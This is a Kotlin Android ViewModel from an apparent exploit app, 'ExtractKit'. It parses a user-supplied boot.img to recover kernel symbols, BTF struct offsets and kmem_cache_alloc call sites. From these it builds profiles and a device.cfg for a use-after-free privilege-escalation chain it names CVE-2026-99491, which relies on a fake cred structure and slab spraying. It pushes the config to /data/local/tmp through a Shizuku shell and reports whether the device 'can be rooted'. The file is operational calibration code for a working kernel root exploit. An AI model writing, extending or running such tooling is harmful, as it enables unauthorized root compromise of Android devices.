package com.extractkit.app

import android.app.Application
import android.content.ClipData
import android.content.ClipboardManager
import android.content.ContentResolver
import android.content.Context
import android.content.Intent
import android.net.Uri
import androidx.compose.runtime.getValue
import androidx.compose.runtime.mutableStateListOf
import androidx.compose.runtime.mutableStateOf
import androidx.compose.runtime.setValue
import androidx.lifecycle.AndroidViewModel
import androidx.lifecycle.viewModelScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext
import java.io.File
import java.io.FileInputStream

/** 十六进制输入：空 / 非法都回退到 fallback（与旧版 num(EditText) 行为一致）。 */
/** 日志环形缓冲：超过 [max] 行就丢最旧的（纯函数，便于单测）。 */
internal fun ringAppend(lines: MutableList<String>, line: String, max: Int) {
    lines.add(line)
    while (lines.size > max) lines.removeAt(0)
}

/** 组 profile 的纯函数部分：不碰 Android，方便单测。 */
internal fun assembleProfile(
    release: String,
    syms: Map<String, Long>,
    off: Offsets,
    measured: ConfigGen.Measured,
    timerAbs: Long?,
    credAbs: Long?,
    timerFallback: Int,
): ConfigGen.Profile {
    val rel = if (release == "?" || release.isBlank()) ConfigGen.Baseline.release else release
    val need = ConfigGen.REQUIRED_SYMBOLS.mapNotNull { n -> syms[n]?.let { n to it } }.toMap()
    return ConfigGen.Profile(
        name = rel.take(48),
        prefix = rel,
        release = rel,
        symbols = need,
        offsets = off,
        measured = measured,
        timerLink = timerAbs ?: ((syms["do_timer_create"] ?: 0L) + timerFallback),
        credLink = credAbs ?: 0L,
        schedAnchors = ConfigGen.schedAnchorsFor(syms),
    )
}

internal fun parseHex(raw: String?, fallback: Int): Int {
    val text = raw?.trim().orEmpty()
    if (text.isEmpty()) return fallback
    return text.removePrefix("0x").removePrefix("0X").toIntOrNull(16) ?: fallback
}

/**
 * 标定页的全部逻辑：解析 boot.img → 出 offsets / 符号表 / call site → 组 profile → 存/分享/下发。
 *
 * 以前这些状态挂在 8 个 View 上（EditText/TextView/MaterialCardView），旋转一次就全丢；
 * 现在放在 ViewModel 里，界面只读状态。
 */
class CalibrationModel(app: Application) : AndroidViewModel(app) {

    var kernel by mutableStateOf("未解析"); private set
    var btfLabel by mutableStateOf("未解析"); private set
    var symsLabel by mutableStateOf("未解析"); private set
    /** EK-W1（CVE-2026-99491）那份 profile 的状态：这一份才决定 99491 能不能直接跑。 */
    var wacomLabel by mutableStateOf("未标定"); private set
    var wacomOk by mutableStateOf(false); private set
    var busy by mutableStateOf(false); private set
    var ready by mutableStateOf(false); private set
    var canSave by mutableStateOf(false); private set
    /** 标定结论：能不能直接提权，不能的原因是什么。 */
    var verdict by mutableStateOf<String?>(null); private set
    var verdictOk by mutableStateOf(false); private set
    var showAdvanced by mutableStateOf(false); private set

    var advTimer by mutableStateOf<String?>(null)
    var advCred by mutableStateOf<String?>(null)
    var advTask by mutableStateOf<String?>(null)
    var advTaskBytes by mutableStateOf<String?>(null)

    val logLines = mutableStateListOf<String>()
    var message by mutableStateOf<String?>(null)
    var shareIntent by mutableStateOf<Intent?>(null)

    private var offsets: Offsets? = null
    private var lastCall: CallSiteFinder.Result? = null
    private var btf: Btf? = null
    private var profile: ConfigGen.Profile? = null
    private var savedFile: File? = null
    private var syms: Map<String, Long> = emptyMap()
    private var release = "?"
    /** 99491 用的那份扁平 JSON；与上面 ConfigGen 那套 profile 是两码事。 */
    private var wacomJson: String? = null

    private fun log(line: String) {
        line.lineSequence().forEach { l -> ringAppend(logLines, l, MAX_LINES) }
    }

    fun clearLog() {
        logLines.clear()
    }

    /** 9.412: 环境自检（本机采集，不需要 adb）正在跑。 */
    var probing by mutableStateOf(false); private set
    /** 9.412: 上一次环境自检的正文；有它就不必先解析 boot.img 也能分享。 */
    private var probeText: String? = null
    /** 分享按钮是否可用：profile 或环境自检报告，任一个有内容即可。 */
    val canShare: Boolean get() = canSave || probeText != null

    /**
     * 9.412 · 一键环境自检。
     *
     * 只做三件事：连 Shizuku(shell 2000) → 让 [EnvProbe] 采 slab / profile / tracefs →
     * 把报告追加进「解析日志」并复制到剪贴板。采到的 verdict 行会直接说下一步该调 spray_len
     * 还是改成同源再分配，不用再来回问。
     */
    fun probeEnv() {
        if (probing) return
        probing = true
        viewModelScope.launch {
            val app = getApplication<Application>()
            // 9.450: 连接 Shizuku 是阻塞调用（没装/没授权时要等 bind + 超时），以前整段跑在主线程，
            // 一点「环境自检」就 ANR。现在连接和采集都挪进 IO，主线程只读状态。
            log("· env probe: 连接 Shizuku ...")
            val connected = withContext(Dispatchers.IO) {
                runCatching {
                    if (!Shell.connected()) Shell.connect(app)
                    Shell.connected()
                }.getOrDefault(false)
            }
            if (!connected) {
                log("! env probe: Shizuku 未连接，先授权再点")
                probing = false
                message = "先连上 Shizuku 再点「环境自检」（没有 shell 采不到 slab / profile）"
                return@launch
            }
            log("· env probe: shell 就绪，开始采集（slab / profile / tracefs）")
            val text = withContext(Dispatchers.IO) {
                runCatching { EnvProbe.collect() }.getOrElse { t ->
                    "! env probe 失败：" + t.javaClass.simpleName + ": " + (t.message ?: "")
                }
            }
            text.lineSequence().forEach { log(it) }
            runCatching {
                val cm = app.getSystemService(Context.CLIPBOARD_SERVICE) as ClipboardManager
                cm.setPrimaryClip(ClipData.newPlainText("extractkit-envprobe", text))
            }
            probeText = text
            probing = false
            // 9.418: 分享改成 .log 文件（用户要求：不要纯文本，打包一个「环境自检.log」）
            val logFile = withContext(Dispatchers.IO) {
                runCatching { EnvProbe.writeReport(app, text) }.getOrNull()
            }
            message = if (logFile != null) {
                "环境自检完成，已生成 " + logFile.name + "，选一个 app 发出即可"
            } else {
                "环境自检完成（" + text.lineSequence().count() + " 行），选一个 app 发出即可"
            }
            // 采完直接弹分享面板：不用先解析 boot.img，也不用再点一次「分享」
            shareLog("ExtractKit 环境自检", text)
        }
    }

    /** 纯文本分享（只在写文件失败时兜底）。 */
    private fun shareUserText(subject: String, body: String) {
        shareIntent = Intent.createChooser(
            Intent(Intent.ACTION_SEND).apply {
                type = "text/plain"
                putExtra(Intent.EXTRA_SUBJECT, subject)
                putExtra(Intent.EXTRA_TEXT, body)
            },
            "分享",
        )
    }

    /**
     * 9.418 · 环境自检报告按「文件」分享：先落成 filesDir/envprobe/环境自检-<stamp>.log，
     * 再用 FileProvider 授权发送 EXTRA_STREAM。写文件失败才退回纯文本。
     */
    private fun shareLog(subject: String, body: String) {
        val ctx = getApplication<Application>()
        val f = runCatching { EnvProbe.writeReport(ctx, body) }.getOrNull()
        if (f == null) {
            shareUserText(subject, body)
            return
        }
        runCatching {
            val uri = androidx.core.content.FileProvider.getUriForFile(ctx, "${ctx.packageName}.files", f)
            shareIntent = Intent.createChooser(
                Intent(Intent.ACTION_SEND).apply {
                    type = "text/plain"
                    putExtra(Intent.EXTRA_SUBJECT, subject)
                    putExtra(Intent.EXTRA_STREAM, uri)
                    addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION)
                    // 部分国产 IM 只看 EXTRA_TEXT，这里放文件名 + 首行摘要，避免「空消息」
                    putExtra(Intent.EXTRA_TEXT, f.name + "（ExtractKit 环境自检）")
                },
                "分享",
            )
        }.onFailure { shareUserText(subject, body) }
    }

    fun setAdvanced(timer: String?, cred: String?, task: String?, taskBytes: String?) {
        advTimer = timer
        advCred = cred
        advTask = task
        advTaskBytes = taskBytes
    }


    fun analyze(resolver: ContentResolver, uri: Uri) {
        if (busy) return
        busy = true
        ready = false
        canSave = false
        clearLog()
        offsets = null
        lastCall = null
        syms = emptyMap()
        release = "?"
        kernel = "未解析"
        btfLabel = "未解析"
        symsLabel = "未解析"
        wacomJson = null
        wacomOk = false
        wacomLabel = "未标定"
        showAdvanced = false
        verdict = null
        verdictOk = false

        viewModelScope.launch {
            try {
                log("opening file...")
                var header = withContext(Dispatchers.IO) { readHeader(resolver, uri) }
                if (header == null || header.size < 64) {
                    fail("标定失败：读不到文件头")
                    return@launch
                }

                // 9.411: 整文件容器（zstd / gzip / lz4 / sparse）先在 App 里解开，再按 boot 头解析。
                // 以前这里只会提示「请在电脑上 zstd -d」，现在直接就地解，用户只需要选文件。
                var unpacked: java.io.File? = null
                val outer = withContext(Dispatchers.IO) { BootImage.containerOf(header) }
                if (outer != null && ImageUnpack.canUnpack(outer)) {
                    log("外层是 " + outer + "，正在解压（大文件要几十秒）...")
                    unpacked = withContext(Dispatchers.IO) {
                        ImageUnpack.unpack(getApplication(), resolver, uri, outer) { msg -> log(msg) }
                    }
                    if (unpacked == null) {
                        fail("标定失败：" + BootImage.containerHint(outer))
                        return@launch
                    }
                    header = withContext(Dispatchers.IO) { readHeader(resolver, Uri.fromFile(unpacked)) }
                    if (header == null || header.size < 64) {
                        fail("标定失败：解压后读不到文件头")
                        return@launch
                    }
                    log("解压后认出 boot 头，继续解析")
                }
                val info = try {
                    BootImage.parseHeader(header)
                } catch (e: BootImage.Unsupported) {
                    fail("标定失败：${e.message}")
                    return@launch
                }
                if (info == null) {
                    val box = BootImage.containerOf(header)
                    if (box != null) log("! 认出来了：外层是 " + box + "，不是 boot 头")
                    fail("标定失败：" + BootImage.containerHint(box ?: ""))
                    return@launch
                }
                log(
                    "boot 头: version=${if (info.headerVersion < 0) "raw Image" else info.headerVersion}" +
                        " kernel=${info.kernelSize / 1024 / 1024} MiB",
                )

                val image = withContext(Dispatchers.IO) {
                    readKernel(resolver, unpacked?.let { Uri.fromFile(it) } ?: uri, info)
                }
                if (image == null || image.isEmpty()) {
                    fail("标定失败：切不出 kernel 段")
                    return@launch
                }
                log("kernel segment: ${image.size / 1024 / 1024} MiB")
                // 9.405: compressed kernel segments (lz4 legacy/frame, gzip) have to be inflated
                // before kallsyms/BTF scanning; zstd is reported instead of silently failing.
                val inflated = withContext(Dispatchers.IO) { BootImage.inflateKernel(image) }
                val kern = inflated.first
                if (inflated.second != null) {
                    log("kernel is compressed (${inflated.second}) -> inflated ${kern.size / 1024 / 1024} MiB")
                    if (inflated.second!!.startsWith("zstd")) {
                        log("! zstd kernel is not supported: decompress it first (tar --zstd / zstd -d) and import the raw Image")
                    }
                }
                release = BootImage.kernelRelease(kern) ?: "?"
                if (release == "?" && inflated.second != null) {
                    log("! still no release string after inflating: this image may use a container we do not decode")
                }
                log("kernel: $release")
                kernel = if (release == "?" || release.isBlank()) "已解析（无版本串）" else release

                // ---- BTF
                log("looking for embedded BTF...")
                val btfBytes = withContext(Dispatchers.IO) { BootImage.extractBtf(kern) }
                if (btfBytes == null) {
                    log("! no BTF in image (may be stripped in this build)")
                } else {
                    log("BTF: ${btfBytes.size / 1024} KiB")
                    runCatching { Btf.parse(btfBytes) }.onSuccess { parsed ->
                        btf = parsed
                        runCatching { ConfigGen.offsetsFromBtf(parsed) }.onSuccess { off ->
                            offsets = off
                            log(off.pretty())
                            btfLabel = "已解析"
                            val ts = parsed.sizeOf("task_struct")
                            val ki = parsed.sizeOf("k_itimer")
                            log(
                                "sizeof  task_struct=${ts?.let { "0x" + Integer.toHexString(it) } ?: "?"}" +
                                    "  k_itimer=${ki?.let { "0x" + Integer.toHexString(it) } ?: "?"}" +
                                    "（尺寸来自 BTF，换内核自动跟着变）",
                            )
                            if (off.credUid != 8) {
                                log("! cred.uid=${off.credUid}: payload assumes uid@8; build_fake_cred() needs matching change")
                            }
                        }.onFailure { log("! BTF struct missing: ${it.message}") }
                    }.onFailure { log("! BTF parse failed: ${it.message}") }
                }

                // ---- kallsyms
                log("scanning kallsyms (~5-20s)...")
                val found = withContext(Dispatchers.IO) {
                    KallsymsFinder.find(kern) { msg -> log(msg) }
                }
                if (found == null) {
                    log("! kallsyms not found")
                    log("  tried all three layouts: 6.4+ BASE_RELATIVE, 6.1/5.15 relative, 4.19/5.4 absolute"); 
                    log("  if the kernel segment is compressed in a way we do not decode (zstd), import a raw Image instead");
                    log("  if CONFIG_KALLSYMS=n or the tables were stripped, no layout can be recovered")
                    fail("标定失败：扫不到符号表（这版内核布局还没适配）")
                } else {
                    syms = found.symbols
                    symsLabel = "${syms.size} 个符号"
                    log("symbols=${syms.size} relative_base=0x${java.lang.Long.toHexString(found.relativeBase)}")
                    if (offsets == null) {
                        log("no BTF in image; mining struct offsets from instructions...")
                        runCatching { ConfigGen.offsetsFromCode(kern, syms, found.relativeBase) }
                            .onSuccess { off ->
                                if (off == null) {
                                    log("! not mined from instructions either (init_posix_timers / cred_init / fork_init / exit_creds)")
                                } else {
                                    offsets = off
                                    log(off.pretty())
                                    log("(source: kmem_cache_create sizeof arg + exit_creds STR XZR)")
                                }
                            }
                            .onFailure { log("! instruction parse failed: ${it.message}") }
                    }
                    val missing = ConfigGen.REQUIRED_SYMBOLS.filter { (syms[it] ?: 0L) == 0L }
                    runCatching { CallSiteFinder.find(kern, syms, found.relativeBase) }
                        .getOrNull()
                        ?.let { cs ->
                            lastCall = cs
                            advTimer = "0x" + Integer.toHexString(cs.timerOffset)
                            advCred = "0x" + Integer.toHexString(cs.credLow21)
                            advTask = "0x" + Integer.toHexString(cs.taskLow21)
                            log("✓ call site derived (disasm bl kmem_cache_alloc*):")
                            cs.detail.forEach { log("   $it") }
                        }
                        ?: run {
                            showAdvanced = true
                            log("! call site not derived; advanced fields expanded for manual entry")
                            fail("漏洞已修复或不支持：找不到 kmem_cache_alloc 调用点")
                        }

                    if (missing.isEmpty()) {
                        log("✓ all 7 required symbols present")
                        ConfigGen.REQUIRED_SYMBOLS.forEach { name ->
                            log("   ${name.padEnd(18)} 0x${java.lang.Long.toHexString(syms[name]!!)}")
                        }
                    } else {
                        log("! missing symbols: ${missing.joinToString()}")
                    }
                }

                // ---- EK-W1（CVE-2026-99491）的 profile：这条链的键跟上面那套完全无关，单独算一份
                buildWacomProfile(kern, found?.relativeBase ?: 0L)

                // 解析完就把 profile 组装好，等用户点「保存 profile」
                if (offsets != null && syms.isNotEmpty()) {
                    val p = buildProfile()
                    profile = p
                    evaluate(p)
                    ready = verdictOk && p != null
                    canSave = ready
                    if (ready) {
                        log("· you may save the profile; same-kernel devices then skip calibration")
                        applyToSoftware()
                    }
                } else {
                    if (verdict == null) fail("标定失败：BTF 偏移或符号表没拿到")
                }
            } finally {
                busy = false
            }
        }
    }

    /**
     * 99491 的 profile 与上面 ConfigGen 那套是两套东西：payload 要的是扁平 JSON、绝对符号地址、
     * cred 分配点低 21 位、cap 位图。算完直接落盘，提权时 ExtractEngine 会优先推这一份。
     */
    private fun buildWacomProfile(image: ByteArray, relativeBase: Long) {
        val parsed = btf
        if (parsed == null || syms.isEmpty() || relativeBase == 0L) {
            log("! 99491 profile skipped: it needs embedded BTF plus kallsyms")
            wacomLabel = "缺 BTF 或符号表"
            return
        }
        val ctx = getApplication<Application>()
        val template = runCatching {
            ctx.assets.open(WACOM_TEMPLATE).use { it.readBytes().toString(Charsets.UTF_8) }
        }.getOrNull()
        if (template == null) {
            log("! 99491 profile skipped: asset " + WACOM_TEMPLATE + " missing")
            wacomLabel = "模板缺失"
            return
        }
        val page = runCatching {
            android.system.Os.sysconf(android.system.OsConstants._SC_PAGESIZE).toInt()
        }.getOrDefault(4096)
        val built = WacomCalib.build(template, release, page, image, relativeBase, syms, parsed)
        built.notes.forEach { log("· 99491: $it") }
        if (!built.ok) {
            built.problems.take(10).forEach { log("! 99491: $it") }
            log("! 99491 profile unusable: ${built.problems.size} problem(s)")
            wacomLabel = "不合格（${built.problems.size} 项）"
            return
        }
        val saved = WacomCalibStore.save(ctx, release, built.json)
        if (saved == null) {
            log("! 99491 profile built but could not be saved")
            wacomLabel = "已解析（存不下）"
            return
        }
        wacomJson = built.json
        wacomOk = true
        wacomLabel = "已解析（${built.derived} 项 / ${saved.length()} B）"
        log("✓ 99491 profile: ${built.derived} values derived, ${saved.length()} B, saved")
        log("  the chain will use it as long as uname().release == " + release)
        buildSymsTable()
    }

    /**
     * 9.404: --ksu 的第一步是 ko_syms_check()，表头 release 必须与 uname -r 全串相等，
     * 否则 ko_patch 报 syms_release、payload 在 UAF 之前就退出。内置表只有三条 build，
     * 所以标定时顺手用这台镜像的 kallsyms 现造一张，名字集合照家族挑模板。
     */
    private fun buildSymsTable() {
        val rel = release
        if (rel == "?" || rel.isBlank()) {
            log("! ko-syms skipped: no release string in this image")
            return
        }
        val ctx = getApplication<Application>()
        val fam = ReleaseMatrix.familyOf(rel)
        val asset = WacomSyms.templateAsset(fam)
        val template = runCatching {
            ctx.assets.open(asset).use { it.readBytes().toString(Charsets.UTF_8) }
        }.getOrNull()
        if (template == null) {
            log("! ko-syms template missing: assets/" + asset)
            return
        }
        val built = WacomSyms.build(template, rel, syms)
        if (built.symbols == 0) {
            log("! ko-syms: none of the " + asset.substringAfterLast('/') + " names exist in this kallsyms")
            return
        }
        if (built.missing.isNotEmpty()) {
            log(
                "· ko-syms: " + built.missing.size + " name(s) absent from this kallsyms: " +
                    built.missing.take(6).joinToString(",") +
                    (if (built.missing.size > 6) ",…" else ""),
            )
        }
        val saved = WacomCalibStore.saveSyms(ctx, rel, built.text)
        if (saved == null) {
            log("! ko-syms built but could not be saved")
            return
        }
        log("✓ ko-syms: " + built.symbols + " symbols (" + asset.substringAfterLast('/') + "), " + saved.length() + " B, saved")
    }

    private fun fail(msg: String) {
        verdict = msg
        verdictOk = false
        log("! $msg")
    }

    /**
     * 标定完必须回答一个问题：这台内核能不能直接提权。
     * 判据与真正跑链时 payload 的要求完全一致 —— 缺一样就当场说清楚，不要等用户点了「开始提权」才失败。
     */
    private fun evaluate(p: ConfigGen.Profile?) {
        if (p == null) {
            fail("标定失败：profile 组不出来")
            return
        }
        val missing = ConfigGen.CORE_SYMBOLS.filter { (p.symbols[it] ?: 0L) == 0L }
        if (missing.isNotEmpty()) {
            fail("标定失败：缺符号 " + missing.joinToString())
            return
        }
        val m2 = p.measured
        if (m2.timerSiteOffset == 0 || m2.credSiteLow21 == 0 || m2.taskAllocLow21 == 0) {
            fail("漏洞已修复或不支持：找不到 kmem_cache_alloc 调用点")
            return
        }
        if (m2.timerSiteOffset < 0 || m2.timerSiteOffset > 0x8000 ||
            m2.credSiteLow21 !in 0 until 0x200000 || m2.taskAllocLow21 !in 0 until 0x200000
        ) {
            fail("标定失败：call site 偏移越界（timer=0x${Integer.toHexString(m2.timerSiteOffset)}）")
            return
        }
        val blob = runCatching { ConfigGen.emitCfgBlob(p.symbols, p.offsets, m2) }
        if (blob.isFailure) {
            fail("标定失败：cfg 生成失败（" + (blob.exceptionOrNull()?.message ?: "未知") + "）")
            return
        }
        val osVer = runCatching { System.getProperty("os.version").orEmpty() }.getOrDefault("")
        val same = osVer.isNotEmpty() && ConfigGen.sameKernel(osVer, p.release)
        verdictOk = true
        verdict = if (same) {
            "✓ 可提权：已生成 device.cfg（${blob.getOrNull()?.size ?: 0} B），可以直接跑"
        } else {
            "⚠ 这份 boot.img 的内核是 " + p.release.take(30) +
                "…，与本机不同；同内核设备可导入后直接跑"
        }
    }

    private fun readHeader(resolver: ContentResolver, uri: Uri): ByteArray? = runCatching {
        resolver.openFileDescriptor(uri, "r")!!.use { pfd ->
            FileInputStream(pfd.fileDescriptor).use { input ->
                val head = ByteArray(4096)
                var read = 0
                while (read < head.size) {
                    val n = input.read(head, read, head.size - read)
                    if (n <= 0) break
                    read += n
                }
                head.copyOf(read)
            }
        }
    }.getOrNull()

    private fun readKernel(resolver: ContentResolver, uri: Uri, info: BootImage.Info): ByteArray? = runCatching {
        resolver.openFileDescriptor(uri, "r")!!.use { pfd ->
            FileInputStream(pfd.fileDescriptor).use { input ->
                BootImage.readKernel(input, info)
            }
        }
    }.getOrNull()

    /** 解析成功后自动执行：生成 device_config.h + device.cfg 并下发（旧版「导入软件」按钮已并入这里）。 */
    private suspend fun applyToSoftware() {
        val off = offsets ?: return
        if (syms.isEmpty()) return
        val ev = if (Shell.connected()) TraceEvents.read { log(it) } else null
        val btfTaskSize = btf?.sizeOf("task_struct")
        val measured = ConfigGen.Measured(
            timerSiteOffset = parseHex(advTimer, 0x94),
            credSiteLow21 = parseHex(advCred, 0x38458),
            taskAllocLow21 = parseHex(advTask, 0x1CB240),
            taskAllocBytes = btfTaskSize ?: parseHex(advTaskBytes, 0x12C0),
            evCacheAlloc = ev?.get(0) ?: 269,
            evCacheFree = ev?.get(1) ?: 272,
            evPageAlloc = ev?.get(2) ?: 275,
            evPageFree = ev?.get(3) ?: 273,
            evPcpuDrain = ev?.get(4) ?: 277,
        )
        if (btfTaskSize != null) log("task alloc size from BTF: 0x${Integer.toHexString(btfTaskSize)}")
        val header = runCatching {
            ConfigGen.emitHeader(release, syms, off, measured, "in-app", "in-app")
        }.getOrElse {
            log("! generation failed: ${it.message}")
            return
        }
        val ctx = getApplication<Application>()
        val dir = File(ctx.getExternalFilesDir(null) ?: ctx.filesDir, "config").apply { mkdirs() }
        File(dir, "device_config.h").writeText(header)

        val blob = ConfigGen.emitCfgBlob(syms, off, measured)
        val cfgFile = ConfigGen.cfgFile(ctx)
        cfgFile.writeBytes(blob)
        log("device.cfg: ${blob.size} B → ${cfgFile.absolutePath}")
        if (!Shell.connected()) Shell.connect(ctx)
        val (rc, out) = withContext(Dispatchers.IO) {
            Shell.pushFile("/data/local/tmp/extract-kit/device.cfg", blob, executable = false)
        }
        log(
            if (rc == 0) "✓ 已自动导入软件（device.cfg 已下发）"
            else "! 下发失败：${out.trim()}（下次「开始提权」部署时还会再推一次）",
        )
        ctx.getSharedPreferences("cfg", android.content.Context.MODE_PRIVATE).edit()
            .putString("release", release)
            .putLong("at", System.currentTimeMillis())
            .apply()
        AppState.needsReprobe = true
        log("==== device_config.h （${header.length} B）====")
        header.lineSequence().forEach { log(it) }
        message = "已导入软件：$release"
    }

    /** 用当前解析结果组装一个可保存/分享的 profile。 */
    fun buildProfile(): ConfigGen.Profile? {
        val off = offsets ?: return null
        if (syms.isEmpty()) return null
        val rel = if (release == "?" || release.isBlank()) ConfigGen.Baseline.release else release
        val ev = if (Shell.connected()) TraceEvents.read { } else null
        val measured = ConfigGen.Measured(
            timerSiteOffset = parseHex(advTimer, 0x94),
            credSiteLow21 = parseHex(advCred, 0x38458),
            taskAllocLow21 = parseHex(advTask, 0x1CB240),
            taskAllocBytes = btf?.sizeOf("task_struct") ?: parseHex(advTaskBytes, 0x12C0),
            credReq = off.credSize,
            credAlloc = ConfigGen.credSlabObjectBytes(off.credSize),
            evCacheAlloc = ev?.get(0) ?: 269,
            evCacheFree = ev?.get(1) ?: 272,
            evPageAlloc = ev?.get(2) ?: 275,
            evPageFree = ev?.get(3) ?: 273,
            evPcpuDrain = ev?.get(4) ?: 277,
        )
        return assembleProfile(
            release = rel,
            syms = syms,
            off = off,
            measured = measured,
            timerAbs = lastCall?.timerAbs,
            credAbs = lastCall?.credAbs,
            timerFallback = parseHex(advTimer, 0x94),
        )
    }

    fun saveProfile() {
        val p = profile ?: buildProfile() ?: run { message = "先选 boot.img 解析完"; return }
        val ctx = getApplication<Application>()
        runCatching { ProfileStore.save(ctx, p) }
            .onSuccess {
                savedFile = it
                log("✓ profile saved: ${it.absolutePath}")
                message = "已保存 profile"
                AppState.needsReprobe = true
            }
            .onFailure { log("! save failed: ${it.message}") }
    }

    fun importProfile(resolver: ContentResolver, uri: Uri) {
        viewModelScope.launch {
            val text = withContext(Dispatchers.IO) {
                runCatching {
                    resolver.openInputStream(uri)!!.use { it.readBytes().toString(Charsets.UTF_8) }
                }.getOrNull()
            }
            val p = text?.let { runCatching { ProfileStore.parse(it) }.getOrNull() }
            if (p == null) {
                log("! not a valid profile file")
                return@launch
            }
            ProfileStore.save(getApplication(), p)
            log("✓ profile imported: ${p.name} (kernel ${p.release})")
            message = "已导入：${p.name}"
            AppState.needsReprobe = true
        }
    }

    fun shareProfile() {
        val ctx = getApplication<Application>()
        // 只做过环境自检时，分享那份报告，而不是报「先解析 boot.img」
        val only = probeText
        var f = savedFile
        if (f == null) {
            // buildProfile 会顺带读一次 trace events，只算一次
            val p = profile ?: run {
                if (offsets == null || syms.isEmpty()) null else buildProfile()
            }
            if (p == null) {
                if (only != null) {
                    shareLog("ExtractKit 环境自检", only)
                    return
                }
                message = "先解析 boot.img，或点一次「环境自检」"
                return
            }
            f = runCatching { ProfileStore.save(ctx, p).also { savedFile = it } }
                .getOrElse {
                    if (only != null) {
                        shareLog("ExtractKit 环境自检", only)
                        return
                    }
                    message = "分享失败：$it"
                    return
                }
        }
        runCatching {
            val uri = androidx.core.content.FileProvider.getUriForFile(ctx, "${ctx.packageName}.files", f)
            shareIntent = Intent.createChooser(
                Intent(Intent.ACTION_SEND).apply {
                    type = "text/plain"
                    putExtra(Intent.EXTRA_STREAM, uri)
                    addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION)
                },
                "分享 profile",
            )
        }.onFailure { message = "分享失败：$it" }
    }

    fun consumeMessage(): String? = message.also { message = null }

    private companion object {
        const val MAX_LINES = 600
        /** 99491 payload 的键序模板，必须与 assets 里那份一致。 */
        const val WACOM_TEMPLATE = "payload/wacom/profile-6.6.json"
    }
}
